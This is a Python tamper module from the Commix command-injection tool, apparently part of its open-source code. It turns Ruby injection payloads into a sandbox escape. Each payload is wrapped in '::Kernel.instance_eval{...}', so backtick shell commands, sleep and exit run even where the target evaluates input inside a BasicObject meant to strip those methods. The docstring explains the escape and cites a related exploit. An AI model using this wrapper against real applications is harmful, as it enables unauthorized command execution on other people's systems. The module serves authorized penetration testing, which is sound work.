#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings
from src.core.controller import checks

"""
About: Runs the payload with Kernel as self, for a sink evaluating Ruby inside a BasicObject
       instance rather than a plain eval().
Notes: This tamper script works against target(s) evaluating Ruby (i.e. option '--eval=ruby').
       'BasicObject.new.instance_eval(value)' is a common way to let a value run as a small DSL -
       a pricing rule, a feature-flag expression - without touching the rest of the application,
       since BasicObject does not inherit from Object and so carries none of Kernel's methods.
       The grammar's own backtick, 'sleep' and 'exit' are all Kernel methods called implicitly on
       self, so every one of them is simply undefined there. 'Kernel.instance_eval{ ... }' runs
       the block with self rebound to Kernel for its whole duration, and needs nothing rewritten
       inside it - the backtick text the grammar already wrote keeps its own escaping exactly.
Reference: https://www.exploit-db.com/exploits/33028 (same shape against JRuby's own sandbox: a
           blocked native call reached instead by changing what the call ran against)
"""

__tamper__ = "basicobjectescape"
__priority__ = settings.PRIORITY.NORMAL

def dependencies():
  return checks.tamper_dep_command_incompatible(__tamper__) or checks.tamper_dep_grammar_only(__tamper__, "ruby")

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

def tamper(payload):
  if settings.EVAL_GRAMMAR.NAME != "ruby":
    return payload
  # One wrap around the whole expression reaches every bare Kernel call inside it at once - the
  # backtick command, a 'sleep' and an 'exit' alike - rather than one rewrite per name.
  return "::Kernel.instance_eval{" + payload + "}"

# eof
